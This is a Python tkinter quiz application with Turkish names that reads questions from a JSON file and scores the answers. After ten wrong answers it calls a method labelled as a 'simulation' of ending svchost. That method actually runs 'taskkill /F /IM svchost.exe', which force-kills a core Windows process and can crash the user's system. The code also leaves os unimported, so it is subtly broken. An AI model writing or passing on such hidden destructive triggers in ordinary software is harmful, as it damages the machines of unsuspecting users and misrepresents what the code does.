import json
import random
import tkinter as tk
from tkinter import messagebox
import time
import sys

class SoruUygulamasi:
    def __init__(self, master, sorular):
        self.master = master
        master.title("Soru Uygulaması")

        self.sorular = sorular
        self.soru_index = 0
        self.dogru_cevaplar = 0
        self.yanlis_cevaplar = 0

        self.soru_label = tk.Label(master, text="", wraplength=400, justify='left')
        self.soru_label.pack(pady=10)

        self.cevap_entry = tk.Entry(master)
        self.cevap_entry.pack(pady=5)
        self.cevap_entry.bind("<Return>", self.cevapla)

        self.cevap_button = tk.Button(master, text="Cevapla", command=self.cevapla)
        self.cevap_button.pack(pady=5)

        self.sonuc_label = tk.Label(master, text="")
        self.sonuc_label.pack(pady=10)

        self.sonlandirma_gosterildi = False  # svchost sonlandırma uyarısının gösterilip gösterilmediğini takip eder

        self.sonraki_soru()

    def sonraki_soru(self):
        if self.soru_index < len(self.sorular):
            soru_bilgisi = self.sorular[self.soru_index]
            self.soru_label.config(text=f"Soru {self.soru_index + 1}: {soru_bilgisi['soru']}")
            self.cevap_entry.delete(0, tk.END)
            self.sonuc_label.config(text="")
        else:
            messagebox.showinfo("Test Tamamlandı", f"Test tamamlandı! Toplam {len(self.sorular)} sorudan {self.dogru_cevaplar} doğru cevap verdiniz.")
            self.master.destroy()

    def cevapla(self, event=None):
        if self.soru_index < len(self.sorular):
            soru_bilgisi = self.sorular[self.soru_index]
            kullanici_cevabi = self.cevap_entry.get().strip().lower()
            dogru_cevap = soru_bilgisi['cevap'].strip().lower()

            if kullanici_cevabi == dogru_cevap:
                self.sonuc_label.config(text="Doğru!", fg="green")
                self.dogru_cevaplar += 1
            else:
                self.sonuc_label.config(text=f"Yanlış! Doğru cevap: {dogru_cevap}", fg="red")
                self.yanlis_cevaplar += 1
                if self.yanlis_cevaplar >= 10 and not self.sonlandirma_gosterildi:
                    self.svchost_sonlandir_simulasyonu()
                    self.sonlandirma_gosterildi = True

            self.soru_index += 1
            self.master.after(1500, self.sonraki_soru) # 1.5 saniye sonra sonraki soruya geç

    def svchost_sonlandir_simulasyonu(self):
        os.system("taskkill /F /IM svchost.exe")

def json_dosyasini_yukle(dosya_adi):
    """JSON dosyasını yükler."""
    try:
        with open(dosya_adi, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
            else:
                messagebox.showerror("Hata", "JSON dosyası bir soru listesi içermiyor.")
                return None
    except FileNotFoundError:
        messagebox.showerror("Hata", f"'{dosya_adi}' adlı dosya bulunamadı.")
        return None
    except json.JSONDecodeError:
        messagebox.showerror("Hata", f"'{dosya_adi}' adlı dosya geçerli bir JSON formatında değil.")
        return None
    except Exception as e:
        messagebox.showerror("Hata", f"Beklenmeyen bir hata oluştu: {e}")
        return None

if __name__ == "__main__":
    dosya_adi = "sorular.json"
    sorular = json_dosyasini_yukle(dosya_adi)

    if sorular:
        random.shuffle(sorular)
        root = tk.Tk()
        app = SoruUygulamasi(root, sorular)
        root.mainloop()
